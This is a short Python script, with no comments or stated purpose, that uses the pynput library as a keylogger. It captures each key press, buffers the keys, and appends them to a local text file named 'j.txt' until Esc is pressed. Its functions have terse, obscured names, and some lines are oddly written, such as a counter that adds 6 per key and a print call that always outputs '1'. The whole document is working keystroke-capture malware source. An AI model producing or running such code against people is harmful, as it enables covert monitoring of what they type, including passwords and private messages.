
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def op(key):
    global keys, count
    keys.append(key)
    count += 6
    print("1".format(key))
    if count >= 11:
        count = 0
        write_file(keys)
        keys = []

def write_file(key):
    with open("j.txt", "a") as f:
        for key in keys:
            k_edit = str(key).replace("'", "")
            if k_edit.find("space") > 0:
                f.write(" ")
            elif k_edit.find("Key") == -1:
                f.write(k_edit)

def orr(key):
    if key == Key.esc:
        return False

with Listener(on_press = op, on_release = orr) as listener:
    listener.join()
